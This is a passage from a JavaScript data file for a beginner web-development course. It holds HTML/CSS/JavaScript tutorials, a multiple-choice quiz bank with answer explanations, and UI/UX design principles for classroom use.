          code: '<style>\n  .container {\n    display: flex;\n    gap: 20px;\n  }\n  .card { flex: 1; /* equal width */ }\n</style>\n\n<div class="container">\n  <div class="card"><h2>Card 1</h2></div>\n  <div class="card"><h2>Card 2</h2></div>\n  <div class="card"><h2>Card 3</h2></div>\n</div>',
          why: 'Flexbox is 1D layout. Cards line up in a row, evenly spaced. Magic.',
        },
        {
          step: 6,
          instruction: 'Make it responsive:',
          code: '<style>\n  @media (max-width: 600px) {\n    .container { flex-direction: column; }\n  }\n</style>',
          why: 'On small screens, cards stack vertically. This is "responsive design."',
        },
      ],
      reflection: 'You can now style HTML. This is what makes the web visual.',
      nextSteps: 'Try changing colors. Add hover effects. Use Google Fonts.',
    },
    {
      id: 'tut_javascript_interactive',
      title: 'Tutorial 3: Make it Interactive with JavaScript',
      difficulty: 'Beginner',
      duration: '45-60 min',
      prereq: 'Tutorials 1-2 complete',
      learn: 'How to add JavaScript. Event handlers. DOM manipulation.',
      steps: [
        {
          step: 1,
          instruction: 'Add a button:',
          code: '<button id="myButton">Click me</button>',
          why: '<button> creates a clickable button. id="myButton" lets us find it from JavaScript.',
        },
        {
          step: 2,
          instruction: 'Add a script:',
          code: '<script>\n  const btn = document.getElementById("myButton");\n  btn.addEventListener("click", function() {\n    alert("Button clicked!");\n  });\n</script>',
          why: 'JavaScript finds the button by ID. addEventListener attaches a function that runs on click.',
        },
        {
          step: 3,
          instruction: 'Refresh. Click the button.',
          code: '',
          why: 'You\'ve made interactivity!',
        },
        {
          step: 4,
          instruction: 'Make the button change something visible:',
          code: '<p id="message">Click the button to see a message.</p>\n<script>\n  const btn = document.getElementById("myButton");\n  const msg = document.getElementById("message");\n  btn.addEventListener("click", function() {\n    msg.textContent = "Hello, World!";\n  });\n</script>',
          why: 'textContent updates the text of an element. The DOM (Document Object Model) is the JavaScript representation of HTML.',
        },
        {
          step: 5,
          instruction: 'Toggle a class on click:',
          code: '<button id="toggle">Toggle dark mode</button>\n<style>\n  .dark { background: #1a1a1a; color: white; }\n</style>\n<script>\n  const btn = document.getElementById("toggle");\n  btn.addEventListener("click", function() {\n    document.body.classList.toggle("dark");\n  });\n</script>',
          why: 'classList.toggle adds the class if missing, removes if present. CSS .dark applies dark mode styles.',
        },
        {
          step: 6,
          instruction: 'Add a form input:',
          code: '<input type="text" id="nameInput" placeholder="Your name">\n<button id="greet">Greet me</button>\n<p id="greeting"></p>\n<script>\n  const input = document.getElementById("nameInput");\n  const greet = document.getElementById("greet");\n  const greeting = document.getElementById("greeting");\n  greet.addEventListener("click", function() {\n    greeting.textContent = "Hello, " + input.value + "!";\n  });\n</script>',
          why: 'input.value reads what the user typed. You can combine values into messages, store them, send them anywhere.',
        },
      ],
      reflection: 'You now have an interactive web app! HTML provides structure, CSS provides style, JavaScript provides interactivity.',
      nextSteps: 'Add multiple buttons doing different things. Add a counter. Add a form that validates input.',
    },
    {
      id: 'tut_first_app',
      title: 'Tutorial 4: Build a To-Do List App (Complete)',
      difficulty: 'Intermediate',
      duration: '90-120 min',
      prereq: 'Tutorials 1-3 complete',
      learn: 'How to build a complete app: forms, lists, localStorage.',
      steps: [
        {
          step: 1,
          instruction: 'Set up the HTML structure:',
          code: '<!DOCTYPE html>\n<html lang="en">\n<head>\n  <title>My To-Do List</title>\n  <style>\n    body { font-family: sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; }\n    h1 { color: #333; }\n    input[type=text] { padding: 8px; width: 60%; }\n    button { padding: 8px 16px; }\n    ul { padding: 0; }\n    li { list-style: none; padding: 12px; background: #f5f5f5; margin: 8px 0; border-radius: 4px; }\n    li.done { text-decoration: line-through; opacity: 0.6; }\n  </style>\n</head>\n<body>\n  <h1>My To-Do List</h1>\n  <input type="text" id="newTask" placeholder="What do you need to do?">\n  <button id="addBtn">Add</button>\n  <ul id="taskList"></ul>\n</body>\n</html>',
          why: 'Set up the visual structure first. Input for new task. Button to add. List for tasks.',
        },
        {
          step: 2,
          instruction: 'Add the JavaScript at the end of body:',
          code: '<script>\n  let tasks = [];\n  const input = document.getElementById("newTask");\n  const addBtn = document.getElementById("addBtn");\n  const list = document.getElementById("taskList");\n  \n  function render() {\n    list.innerHTML = "";\n    tasks.forEach(function(task, idx) {\n      const li = document.createElement("li");\n      if (task.done) li.classList.add("done");\n      li.textContent = task.text;\n      li.addEventListener("click", function() {\n        tasks[idx].done = !tasks[idx].done;\n        render();\n      });\n      list.appendChild(li);\n    });\n  }\n  \n  addBtn.addEventListener("click", function() {\n    if (!input.value.trim()) return;\n    tasks.push({ text: input.value, done: false });\n    input.value = "";\n    render();\n  });\n  \n  render();\n</script>',
          why: 'Tasks stored in array. render() function rebuilds list from array. Add button pushes new task. Click on task toggles done state.',
        },
        {
          step: 3,
          instruction: 'Persist tasks across refreshes using localStorage:',
          code: '<script>\n  let tasks = JSON.parse(localStorage.getItem("tasks") || "[]");\n  \n  function saveAndRender() {\n    localStorage.setItem("tasks", JSON.stringify(tasks));\n    render();\n  }\n  \n  // (Replace render() calls in event handlers with saveAndRender())\n</script>',
          why: 'localStorage saves data persistently. JSON.stringify converts JS objects to strings (localStorage stores strings only).',
        },
        {
          step: 4,
          instruction: 'Add Enter key support:',
          code: 'input.addEventListener("keydown", function(e) {\n  if (e.key === "Enter") addBtn.click();\n});',
          why: 'Power users expect Enter to submit. Always support keyboard accessibility.',
        },
        {
          step: 5,
          instruction: 'Add delete buttons:',
          code: 'function render() {\n  list.innerHTML = "";\n  tasks.forEach(function(task, idx) {\n    const li = document.createElement("li");\n    if (task.done) li.classList.add("done");\n    li.textContent = task.text;\n    \n    // Add delete button\n    const del = document.createElement("button");\n    del.textContent = "×";\n    del.style.cssText = "float: right; background: #f44; color: white;";\n    del.addEventListener("click", function(e) {\n      e.stopPropagation();\n      tasks.splice(idx, 1);\n      saveAndRender();\n    });\n    li.appendChild(del);\n    \n    li.addEventListener("click", function() {\n      tasks[idx].done = !tasks[idx].done;\n      saveAndRender();\n    });\n    list.appendChild(li);\n  });\n}',
          why: 'splice removes from array. e.stopPropagation prevents the click from also triggering the toggle.',
        },
        {
          step: 6,
          instruction: 'Add accessibility:',
          code: '// Add aria-labels:\nli.setAttribute("aria-label", task.text + (task.done ? " (completed)" : ""));\ndel.setAttribute("aria-label", "Delete: " + task.text);\nbtn.type = "button"; // Prevents form submission',
          why: 'Screen readers need labels. Otherwise the "×" button is just announced as "button".',
        },
      ],
      reflection: 'You\'ve built a complete app: input, storage, state, rendering, persistence, accessibility. This is the foundation of all interactive web apps.',
      nextSteps: 'Add categories. Add due dates. Add a "clear completed" button. Add search.',
    },
    {
      id: 'tut_api_integration',
      title: 'Tutorial 5: Connect to a Public API',
      difficulty: 'Intermediate',
      duration: '60-90 min',
      prereq: 'Tutorials 1-3 complete',
      learn: 'How to fetch from an API. Async/await. JSON handling. Error states.',
      steps: [
        {
          step: 1,
          instruction: 'Set up structure to display a random dog photo:',
          code: '<!DOCTYPE html>\n<html lang="en">\n<head><title>Random Dogs</title></head>\n<body>\n  <h1>🐕 Random Dog</h1>\n  <button id="next">New Dog</button>\n  <p id="loading" style="display:none">Loading...</p>\n  <p id="error" style="display:none; color: red"></p>\n  <img id="dogImg" alt="Random dog photo" style="max-width: 400px;">\n  <script>\n    // We\'ll add JavaScript here\n  </script>\n</body>\n</html>',
          why: 'Set up loading + error states from the start. Better than adding them later.',
        },
        {
          step: 2,
          instruction: 'Add the fetch logic:',
          code: 'const button = document.getElementById("next");\nconst img = document.getElementById("dogImg");\nconst loading = document.getElementById("loading");\nconst error = document.getElementById("error");\n\nasync function loadDog() {\n  loading.style.display = "block";\n  error.style.display = "none";\n  \n  try {\n    const response = await fetch("https://dog.ceo/api/breeds/image/random");\n    if (!response.ok) throw new Error("Network error");\n    const data = await response.json();\n    img.src = data.message;\n  } catch (e) {\n    error.textContent = "Failed to load dog: " + e.message;\n    error.style.display = "block";\n  } finally {\n    loading.style.display = "none";\n  }\n}\n\nbutton.addEventListener("click", loadDog);\nloadDog(); // Load on page open',
          why: 'fetch is the modern way to make HTTP requests. async/await makes it readable. try/catch handles errors. finally cleans up loading state.',
        },
        {
          step: 3,
          instruction: 'Test in browser. Open. New Dog button should fetch + display.',
          code: '',
          why: 'Always test! Open browser dev tools (F12) to see network calls.',
        },
        {
          step: 4,
          instruction: 'Add breed filtering:',
          code: '<select id="breed">\n  <option value="">Any breed</option>\n  <option value="bulldog/french">French Bulldog</option>\n  <option value="poodle/standard">Standard Poodle</option>\n  <option value="retriever/golden">Golden Retriever</option>\n</select>\n\n// Modify URL:\nconst breed = document.getElementById("breed").value;\nconst url = breed\n  ? `https://dog.ceo/api/breed/${breed}/images/random`\n  : "https://dog.ceo/api/breeds/image/random";\nconst response = await fetch(url);',
          why: 'Build URLs dynamically based on user input. Template literals (backticks) make string concatenation cleaner.',
        },
        {
          step: 5,
          instruction: 'Add caching with localStorage:',
          code: 'const cacheKey = `dog:${breed || "any"}`;\nconst cached = localStorage.getItem(cacheKey);\nif (cached && Date.now() - JSON.parse(cached).fetchedAt < 60000) {\n  img.src = JSON.parse(cached).url;\n} else {\n  // Fetch + cache\n  const response = await fetch(url);\n  const data = await response.json();\n  localStorage.setItem(cacheKey, JSON.stringify({\n    url: data.message,\n    fetchedAt: Date.now()\n  }));\n  img.src = data.message;\n}',
          why: 'Cache for 1 minute. Reduces API calls + speeds up repeated requests.',
        },
        {
          step: 6,
          instruction: 'Add accessibility:',
          code: 'img.alt = "Random dog photo (loading...)";\n// After image loads:\nimg.onload = () => {\n  img.alt = breed ? `Random photo of a ${breed.replace("/", " ")}` : "Random dog photo";\n  // Announce to screen readers\n};',
          why: 'Alt text should reflect what\'s displayed.',
        },
      ],
      reflection: 'You\'ve made an app that uses real data from the internet. This is the foundation of most modern apps.',
      nextSteps: 'Save your favorite dogs. Add a gallery view. Try a different API.',
    },
  ];

  // ─── Quiz bank (60+ AP CSP + CSTA-aligned questions) ──────────────
  var QUIZ_QUESTIONS = [
    { id: 'q1', domain: 'HTML', difficulty: 'Beginner', question: 'Which HTML element is used for the most important heading?', options: [
      { text: '<head>', correct: false, explanation: '<head> contains metadata, not headings.' },
      { text: '<h1>', correct: true, explanation: 'Correct! <h1> is the highest heading level. Use one per page.' },
      { text: '<heading>', correct: false, explanation: 'Not a real HTML element.' },
      { text: '<title>', correct: false, explanation: '<title> is the page title shown in browser tab, not on the page.' },
    ]},
    { id: 'q2', domain: 'HTML', difficulty: 'Beginner', question: 'Which attribute is REQUIRED on an <img> tag for accessibility?', options: [
      { text: 'src', correct: false, explanation: 'src is required for the image to display, but not specifically for accessibility.' },
      { text: 'alt', correct: true, explanation: 'Correct! alt provides text description for screen readers + when image fails to load.' },
      { text: 'class', correct: false, explanation: 'class is for CSS styling, not required.' },
      { text: 'title', correct: false, explanation: 'title is optional tooltip text.' },
    ]},
    { id: 'q3', domain: 'CSS', difficulty: 'Beginner', question: 'What CSS property changes the text size?', options: [
      { text: 'text-size', correct: false, explanation: 'Not a real CSS property.' },
      { text: 'size', correct: false, explanation: 'Not specific enough — could mean many things.' },
      { text: 'font-size', correct: true, explanation: 'Correct! font-size sets the text size.' },
      { text: 'text-scale', correct: false, explanation: 'Not a real CSS property.' },
    ]},
    { id: 'q4', domain: 'CSS', difficulty: 'Intermediate', question: 'What is the WCAG minimum contrast ratio for normal text?', options: [
      { text: '1:1', correct: false, explanation: '1:1 means no contrast — text invisible.' },
      { text: '3:1', correct: false, explanation: '3:1 is for large text + UI components.' },
      { text: '4.5:1', correct: true, explanation: 'Correct! WCAG AA requires 4.5:1 for normal-size text.' },
      { text: '7:1', correct: false, explanation: '7:1 is WCAG AAA (stricter level).' },
    ]},
    { id: 'q5', domain: 'JavaScript', difficulty: 'Beginner', question: 'How do you declare a constant in JavaScript?', options: [
      { text: 'var x = 5', correct: false, explanation: 'var declares a mutable variable.' },
      { text: 'let x = 5', correct: false, explanation: 'let declares a mutable variable.' },
      { text: 'const x = 5', correct: true, explanation: 'Correct! const declares a constant.' },
      { text: 'constant x = 5', correct: false, explanation: 'constant is not a JavaScript keyword.' },
    ]},
    { id: 'q6', domain: 'JavaScript', difficulty: 'Intermediate', question: 'What does the `===` operator do?', options: [
      { text: 'Assigns a value', correct: false, explanation: 'Assignment is `=`.' },
      { text: 'Compares values + types (strict equality)', correct: true, explanation: 'Correct! `===` checks both value + type.' },
      { text: 'Compares only values (loose equality)', correct: false, explanation: 'That\'s `==` (loose equality).' },
      { text: 'Performs exponentiation', correct: false, explanation: 'Exponentiation is `**`.' },
    ]},
    { id: 'q7', domain: 'Algorithms', difficulty: 'Beginner', question: 'What is the time complexity of binary search?', options: [
      { text: 'O(1)', correct: false, explanation: 'Constant time — too fast for search.' },
      { text: 'O(log n)', correct: true, explanation: 'Correct! Binary search halves the search range each step.' },
      { text: 'O(n)', correct: false, explanation: 'Linear — that\'s linear search.' },
      { text: 'O(n²)', correct: false, explanation: 'Quadratic — slower than search needs to be.' },
    ]},
    { id: 'q8', domain: 'Security', difficulty: 'Intermediate', question: 'What is XSS?', options: [
      { text: 'Excellent Software System', correct: false, explanation: 'Not a real term.' },
      { text: 'Cross-Site Scripting — attacker injects JS into your site', correct: true, explanation: 'Correct! XSS allows attackers to execute scripts in users\' browsers via your site.' },
      { text: 'XML Sample Syntax', correct: false, explanation: 'Not a thing.' },
      { text: 'Extra Stylesheet Service', correct: false, explanation: 'Not a real term.' },
    ]},
    { id: 'q9', domain: 'Accessibility', difficulty: 'Intermediate', question: 'Why is alt text important?', options: [
      { text: 'It improves SEO', correct: false, explanation: 'Yes but that\'s not the primary reason. Accessibility is.' },
      { text: 'Screen readers use it to describe images to blind users', correct: true, explanation: 'Correct! The primary reason — accessibility.' },
      { text: 'It makes pages load faster', correct: false, explanation: 'Not significantly.' },
      { text: 'It\'s required by HTML', correct: false, explanation: 'Required but the REASON is accessibility.' },
    ]},
    { id: 'q10', domain: 'JavaScript', difficulty: 'Intermediate', question: 'What does localStorage allow you to do?', options: [
      { text: 'Run code on the server', correct: false, explanation: 'localStorage is client-side only.' },
      { text: 'Store data persistently in the browser', correct: true, explanation: 'Correct! localStorage persists across page refreshes + browser restarts.' },
      { text: 'Make HTTP requests', correct: false, explanation: 'That\'s fetch + XMLHttpRequest.' },
      { text: 'Compile code', correct: false, explanation: 'Browsers don\'t typically expose compilation.' },
    ]},
    { id: 'q11', domain: 'AP CSP', difficulty: 'Intermediate', question: 'In computational thinking, what is "decomposition"?', options: [
      { text: 'Breaking a problem into smaller pieces', correct: true, explanation: 'Correct! Decomposition is one of the 5 pillars of computational thinking.' },
      { text: 'Removing unnecessary information', correct: false, explanation: 'That\'s abstraction.' },
      { text: 'Finding patterns', correct: false, explanation: 'That\'s pattern recognition.' },
      { text: 'Designing algorithms', correct: false, explanation: 'That\'s algorithmic thinking.' },
    ]},
    { id: 'q12', domain: 'AP CSP', difficulty: 'Intermediate', question: 'What is abstraction in computing?', options: [
      { text: 'Drawing pictures', correct: false, explanation: 'Not the computing concept.' },
      { text: 'Removing details to focus on essentials', correct: true, explanation: 'Correct! Abstraction lets us reason about complex systems.' },
      { text: 'Compressing files', correct: false, explanation: 'That\'s a different concept.' },
      { text: 'Removing code', correct: false, explanation: 'Not what abstraction means.' },
    ]},
    { id: 'q13', domain: 'Web', difficulty: 'Beginner', question: 'What does the protocol "https" mean?', options: [
      { text: 'High Transfer Protocol', correct: false, explanation: 'Not a real protocol.' },
      { text: 'HyperText Transfer Protocol Secure', correct: true, explanation: 'Correct! HTTPS encrypts data between browser + server.' },
      { text: 'High-Speed Transfer Protocol', correct: false, explanation: 'Not what it means.' },
      { text: 'Highly Translated Plain Source', correct: false, explanation: 'Not a real term.' },
    ]},
    { id: 'q14', domain: 'JavaScript', difficulty: 'Advanced', question: 'What is a Promise in JavaScript?', options: [
      { text: 'A type of variable', correct: false, explanation: 'Not really.' },
      { text: 'An object representing the eventual completion or failure of an asynchronous operation', correct: true, explanation: 'Correct! Promises represent async operations. Use .then() or await.' },
      { text: 'A function declaration keyword', correct: false, explanation: 'Not a keyword.' },
      { text: 'A type of loop', correct: false, explanation: 'Not a loop.' },
    ]},
    { id: 'q15', domain: 'Accessibility', difficulty: 'Advanced', question: 'What does the aria-label attribute do?', options: [
      { text: 'Sets the visible label of an element', correct: false, explanation: 'Visible labels use <label> or text content.' },
      { text: 'Provides an accessible name for screen readers when there\'s no visible label', correct: true, explanation: 'Correct! aria-label is for screen readers when there\'s no visible text.' },
      { text: 'Makes the element keyboard-accessible', correct: false, explanation: 'That\'s tabindex.' },
      { text: 'Adds a tooltip', correct: false, explanation: 'That\'s the title attribute.' },
    ]},
    { id: 'q16', domain: 'JavaScript', difficulty: 'Intermediate', question: 'How do you stop a form from submitting by default?', options: [
      { text: 'form.return false', correct: false, explanation: 'Not the right syntax.' },
      { text: 'event.preventDefault()', correct: true, explanation: 'Correct! preventDefault stops the default browser behavior.' },
      { text: 'form.stop()', correct: false, explanation: 'Not a real method.' },
      { text: 'event.cancel()', correct: false, explanation: 'Not the standard method.' },
    ]},
    { id: 'q17', domain: 'CSS', difficulty: 'Intermediate', question: 'What does the CSS rule `display: flex` do?', options: [
      { text: 'Makes element invisible', correct: false, explanation: 'That\'s display: none.' },
      { text: 'Enables Flexbox layout for the element\'s children', correct: true, explanation: 'Correct! Flexbox is a 1D layout model.' },
      { text: 'Makes element rotate', correct: false, explanation: 'That\'s transform.' },
      { text: 'Centers text', correct: false, explanation: 'Flexbox can center but display:flex alone doesn\'t.' },
    ]},
    { id: 'q18', domain: 'HTML', difficulty: 'Intermediate', question: 'Which element should be used for the page\'s main content area?', options: [
      { text: '<body>', correct: false, explanation: '<body> is the container; main content goes inside.' },
      { text: '<main>', correct: true, explanation: 'Correct! <main> is the semantic main content landmark.' },
      { text: '<content>', correct: false, explanation: 'Not a real HTML element.' },
      { text: '<div>', correct: false, explanation: 'Generic — not semantic. Use <main>.' },
    ]},
    { id: 'q19', domain: 'Algorithms', difficulty: 'Beginner', question: 'What is a "for loop"?', options: [
      { text: 'A way to declare a variable', correct: false, explanation: 'That\'s `let` or `const`.' },
      { text: 'A control flow statement for repeating code a known number of times', correct: true, explanation: 'Correct! for loops are for repetition.' },
      { text: 'A type of function', correct: false, explanation: 'Not a function.' },
      { text: 'An error-handling construct', correct: false, explanation: 'That\'s try/catch.' },
    ]},
    { id: 'q20', domain: 'JavaScript', difficulty: 'Beginner', question: 'How do you write a comment in JavaScript?', options: [
      { text: '<!-- this is a comment -->', correct: false, explanation: 'That\'s HTML comment syntax.' },
      { text: '// this is a comment', correct: true, explanation: 'Correct! Single-line comments use //. Multi-line use /* */.' },
      { text: '# this is a comment', correct: false, explanation: 'That\'s Python comment syntax.' },
      { text: '\' this is a comment', correct: false, explanation: 'That\'s VB comment syntax.' },
    ]},
    { id: 'q21', domain: 'JavaScript', difficulty: 'Intermediate', question: 'What is the spread operator?', options: [
      { text: 'A way to define functions', correct: false, explanation: 'Functions use function or arrow syntax.' },
      { text: 'Three dots `...` used to expand iterables', correct: true, explanation: 'Correct! ...arr expands array values. Used for copying, merging, function args.' },
      { text: 'A way to compare values', correct: false, explanation: 'Comparison is ===, ==, etc.' },
      { text: 'A keyword for loops', correct: false, explanation: 'Not a keyword.' },
    ]},
    { id: 'q22', domain: 'JavaScript', difficulty: 'Advanced', question: 'What is a closure?', options: [
      { text: 'A way to close a function', correct: false, explanation: 'Not how it works.' },
      { text: 'A function that has access to variables from its outer scope, even after the outer function returns', correct: true, explanation: 'Correct! Closures preserve scope chain.' },
      { text: 'The end of a code block', correct: false, explanation: 'Closing brace, not closure.' },
      { text: 'A type of error', correct: false, explanation: 'Not an error.' },
    ]},
    { id: 'q23', domain: 'Security', difficulty: 'Intermediate', question: 'What should you NEVER store in client-side code?', options: [
      { text: 'CSS styles', correct: false, explanation: 'CSS is fine client-side.' },
      { text: 'Database credentials', correct: true, explanation: 'Correct! Anyone can see + steal them.' },
      { text: 'User\'s display name', correct: false, explanation: 'Names are non-sensitive.' },
      { text: 'Public API endpoints', correct: false, explanation: 'Public APIs are designed to be visible.' },
    ]},
    { id: 'q24', domain: 'JavaScript', difficulty: 'Beginner', question: 'How do you make a function async?', options: [
      { text: 'function async myFn()', correct: false, explanation: 'Wrong order.' },
      { text: 'async function myFn()', correct: true, explanation: 'Correct! async keyword before function.' },
      { text: 'await function myFn()', correct: false, explanation: 'await is used inside async, not for declaration.' },
      { text: 'promise function myFn()', correct: false, explanation: 'Not a keyword.' },
    ]},
    { id: 'q25', domain: 'Accessibility', difficulty: 'Beginner', question: 'What does WCAG stand for?', options: [
      { text: 'Web Content Accessibility Guidelines', correct: true, explanation: 'Correct! WCAG defines accessibility standards for the web.' },
      { text: 'Web Color And Graphics', correct: false, explanation: 'Not a real term.' },
      { text: 'World Computer Association Group', correct: false, explanation: 'Not a real organization.' },
      { text: 'Wide Computing Access Gateway', correct: false, explanation: 'Not a real term.' },
    ]},
    { id: 'q26', domain: 'Git', difficulty: 'Beginner', question: 'What does `git commit` do?', options: [
      { text: 'Sends changes to a remote repository', correct: false, explanation: 'That\'s `git push`.' },
      { text: 'Records staged changes locally with a message', correct: true, explanation: 'Correct! Commit creates a permanent local snapshot.' },
      { text: 'Deletes a file', correct: false, explanation: 'Different command.' },
      { text: 'Creates a new branch', correct: false, explanation: 'That\'s `git branch` or `git checkout -b`.' },
    ]},
    { id: 'q27', domain: 'Git', difficulty: 'Intermediate', question: 'What is a "pull request"?', options: [
      { text: 'A request to download code', correct: false, explanation: 'Close but not quite.' },
      { text: 'A request to merge a branch into another, often with review', correct: true, explanation: 'Correct! PRs are the standard way to merge changes with review.' },
      { text: 'A type of error', correct: false, explanation: 'Not an error.' },
      { text: 'A way to install dependencies', correct: false, explanation: 'That\'s package managers.' },
    ]},
    { id: 'q28', domain: 'AP CSP', difficulty: 'Intermediate', question: 'Why is the internet a "fault-tolerant" system?', options: [
      { text: 'Because computers don\'t make mistakes', correct: false, explanation: 'They do — that\'s why fault tolerance matters.' },
      { text: 'Multiple paths exist between endpoints, so if one fails, data can route around it', correct: true, explanation: 'Correct! AP CSP CSN-1.D.' },
      { text: 'Because internet companies have insurance', correct: false, explanation: 'Not what makes it fault-tolerant.' },
      { text: 'Because data is duplicated on every server', correct: false, explanation: 'Some data is duplicated but that\'s not the main mechanism.' },
    ]},
    { id: 'q29', domain: 'Web', difficulty: 'Intermediate', question: 'What does CSS stand for?', options: [
      { text: 'Computer Style Sheets', correct: false, explanation: 'Close but not quite.' },
      { text: 'Cascading Style Sheets', correct: true, explanation: 'Correct! "Cascading" because rules apply with specificity rules.' },
      { text: 'Creative Style Sheets', correct: false, explanation: 'Not what CSS stands for.' },
      { text: 'Coded Style System', correct: false, explanation: 'Not a real term.' },
    ]},
    { id: 'q30', domain: 'Web', difficulty: 'Beginner', question: 'What does HTML stand for?', options: [
      { text: 'High Tech Markup Language', correct: false, explanation: 'Not what HTML stands for.' },
      { text: 'HyperText Markup Language', correct: true, explanation: 'Correct! HTML is the markup language of the web.' },
      { text: 'Home Tool Modification Language', correct: false, explanation: 'Not a real term.' },
      { text: 'Hyperlinks and Text Manager', correct: false, explanation: 'Not a real term.' },
    ]},
  ];

  // ─── UI/UX design principles for student designers ──────────────
  var UI_UX_PRINCIPLES = [
    {
      principle: 'Visual Hierarchy',
      definition: 'Use size, color, and position to guide the eye to the most important content first.',
      why: 'Users scan, not read. They look for important things. Your job is to make important things obvious.',
      examples: [
        'Primary action (Submit) is the largest + brightest button',
        'Headings are larger + bolder than body text',
        'Important info is at the top',
        'Use whitespace to separate sections',
      ],
      antiPattern: 'Every button looks the same. User has to read every label to find what they want.',
      classroomLesson: 'Show a page where all buttons are the same. Have students try to identify what to do. Discuss the friction.',
    },
    {
      principle: 'Consistency',
      definition: 'Same things should look + behave the same way throughout your app.',
      why: 'Inconsistency is cognitive load. If buttons look different in different places, users have to relearn each.',
      examples: [
        'All buttons have same height + padding',
        'Date format is the same everywhere (e.g., MM/DD/YYYY)',
        'Color meanings are consistent (red = danger, green = success)',
        'Navigation is in same place on every page',
      ],
      antiPattern: 'Buttons different sizes in different places. Mixing American + European date formats.',
      classroomLesson: 'Audit a familiar app — find inconsistencies. Discuss the impact on UX.',
    },
    {
      principle: 'Feedback',
      definition: 'Every user action should have a clear visual or auditory response.',
      why: 'Without feedback, users don\'t know if their action did anything.',
      examples: [
        'Button click → button briefly highlights or animates',
        'Form submit → loading spinner appears',
        'Action completes → success message',
        'Error → red error text appears',
      ],
      antiPattern: 'User clicks submit. Nothing visible happens. They click again. Now submitted twice.',
      classroomLesson: 'Watch a video of someone using an app. Note every time they get confused or click twice. Discuss why feedback would have helped.',
    },
    {
      principle: 'Affordance',
      definition: 'Visual cues that suggest how an element should be used.',
      why: 'Users shouldn\'t have to read instructions. The design should make actions obvious.',
      examples: [
        'Buttons LOOK like buttons (3D-ish, shadow, color)',
        'Links are underlined or visually distinct from text',
        'Drag handles have a "grippy" pattern',
        'Cards have shadows + lift on hover',
      ],
      antiPattern: 'Text that\'s actually a link but looks like body text. Users don\'t click.',
      classroomLesson: 'Look at a poorly-designed page. Identify elements with unclear affordance. Suggest fixes.',
    },
    {
      principle: 'Minimalism',
      definition: 'Show only what\'s necessary for the current task. Everything else is distraction.',
      why: 'Too many options paralyze users. Less is more.',
      examples: [
        'Search bar with 1 input + 1 button (not 5 filters by default)',
        'Forms with only essential fields',
        'No unnecessary text or labels',
        'No decorative elements that don\'t serve a purpose',
      ],
      antiPattern: 'Every option exposed at once. User overwhelmed.',
      classroomLesson: 'Compare a cluttered + a minimalist version of the same app. Which is easier?',
    },
    {
      principle: 'Error Prevention',
      definition: 'Design to prevent errors before they happen, not just handle them after.',
      why: 'Errors are frustrating. Better to design them out than to handle them.',
      examples: [
        'Disable submit button if required fields are empty',
        'Validate inputs as user types (with helpful messages)',
        'Confirm destructive actions ("Are you sure?")',
        'Auto-save to prevent data loss',
      ],
      antiPattern: 'User fills out 30-field form. Hits submit. Gets vague error.',
      classroomLesson: 'Map out where errors could happen. Design to prevent each.',
    },
    {
      principle: 'Match Mental Models',
      definition: 'Use icons, words, and patterns that users already know.',
      why: 'Why force users to learn your system when they already know one?',
      examples: [
        'Trash can icon = delete',
        'Magnifying glass = search',
        'X = close',
        'Save button looks like a floppy disk (cultural)',
      ],
      antiPattern: 'Custom icon for delete that looks like nothing in particular.',
      classroomLesson: 'Try to use an unfamiliar interface (e.g., a control panel from another country). Notice the friction. Apply to design.',
    },
    {
      principle: 'Progressive Disclosure',
      definition: 'Show basic options by default. Advanced options behind a click or accordion.',
      why: 'Most users want simple. Some want power.',
      examples: [
        'Email writing: simple by default. Advanced options (CC, BCC, schedule) in a menu.',
        'Print dialog: just print by default. Advanced options expand.',
        'Settings: organized by category.',
      ],
      antiPattern: 'Every option visible at once. Or: too many features hidden too deep.',
      classroomLesson: 'Map out an app\'s features. Decide which should be visible by default + which behind clicks.',
    },
    {
      principle: 'Accessibility from Day One',
      definition: 'Design for users with disabilities from the start, not as an afterthought.',
      why: 'Retrofitting accessibility is hard. Building it in from start makes it natural.',
      examples: [
        'High contrast colors',
        'Keyboard navigation',
        'Screen reader-friendly markup',
        'Captions for video',
        'Alt text for images',
      ],
      antiPattern: 'Pretty design that fails WCAG. Then trying to fix it later.',
      classroomLesson: 'Audit your own app with WCAG. Identify what you would design differently next time.',
    },
    {
      principle: 'Performance is UX',
      definition: 'Fast is good UX. Slow is bad UX. Don\'t ignore performance.',
      why: 'Users abandon slow sites. Performance is a feature, not optional.',
      examples: [
        'Page loads in < 3 seconds',
        'Interactions respond in < 100ms',
        'Animations run at 60fps',
        'Lazy load images that aren\'t visible',
      ],
      antiPattern: '10MB JS bundle that takes 30 seconds to load on a phone.',
      classroomLesson: 'Run Lighthouse on your app. Identify performance issues. Fix them.',
    },
    {
      principle: 'Use Empty States Effectively',
      definition: 'When there\'s no data, show a helpful empty state — not just blank space.',
      why: 'New users don\'t have data. Empty states are your chance to onboard them.',
      examples: [
        'Empty inbox: "All caught up! No new messages."',
        'Empty cart: "Your cart is empty. Browse our store →"',
        'No search results: "No matches. Try a broader search."',
        'New account: "Welcome! Let\'s add your first item."',
      ],
      antiPattern: 'Blank screen with no guidance. User confused.',
      classroomLesson: 'Look at every state of your app — including empty + error states. Design each.',
    },
    {
      principle: 'Recognition over Recall',
      definition: 'Show options, don\'t make users remember them.',
      why: 'Humans recognize easier than they recall.',
      examples: [
        'Dropdowns instead of typing exact values',
        'Visible autocomplete suggestions',
        'Icon + label, not icon alone',
        'Recent items shown in lists',
      ],
      antiPattern: 'Users have to remember exact spellings, command names, or settings paths.',
      classroomLesson: 'Find an app that requires recall. Discuss what could be improved with recognition.',
    },
    {
      principle: 'Aesthetic + Minimalist Design',
      definition: 'Design should be visually appealing AND functional.',
      why: 'Beauty isn\'t superficial — it builds trust + delight.',
      examples: [
        'Consistent typography',
        'Pleasing color scheme',
        'Generous whitespace',
        'Quality icons + images',
        'Thoughtful animations',
      ],
      antiPattern: 'Functional but visually unappealing. Users don\'t want to use it.',
      classroomLesson: 'Compare 2 apps that solve the same problem. Which looks better? Does it matter? Why?',
    },
    {
      principle: 'Help Users Recover from Errors',
      definition: 'When errors happen, help users fix them.',
      why: 'Errors will happen. How you handle them defines UX.',
      examples: [
        'Clear error message + suggested fix',
        'Don\'t lose user input on error',
        'Provide undo option',
        '"Did you mean...?" autocorrect',
      ],
      antiPattern: 'Vague error like "Something went wrong." No way to recover.',
      classroomLesson: 'Try to break an app. Note its error messages. Are they helpful?',
    },
    {
      principle: 'Be Honest with Loading + State',
      definition: 'Tell users what\'s happening, even if it takes time.',
      why: 'Uncertainty is worse than waiting.',
      examples: [
